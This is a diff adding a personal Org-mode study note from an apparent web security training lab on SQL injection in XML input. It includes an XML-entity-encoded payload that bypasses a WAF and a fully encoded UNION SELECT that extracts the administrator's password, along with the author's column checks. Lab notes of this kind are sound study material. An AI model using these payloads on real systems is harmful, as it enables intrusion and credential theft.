@@ -1,0 +1,24 @@
+:PROPERTIES:
+:ID:       9c06f159-38f8-4080-ba17-18ea43ab0374
+:END:
+#+title: SQL injection in different contexts
+#+created: [2025-08-09 Sat 16:03]
+#+filetags: :cyber:sql
+* SQL injection in different contexts
+In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+
+These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT:
+
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+This will be decoded server-side before being passed to the SQL interpreter.
+** LAB SQL injection with filter bypass via XML encoding
+- Solved this by encoding all character for the statement:
+  UNION SELECT password FROM users WHERE username='administrator'--
+  into decimal, so final result was:
+  <storeId>1 &#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#61;&#39;&#97;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#39;&#45;&#45;
+</storeId>
+
+I also checked how many columns where available and if it accepted strings, once I found out it was 1, and yes it accepted strings, I was flying.
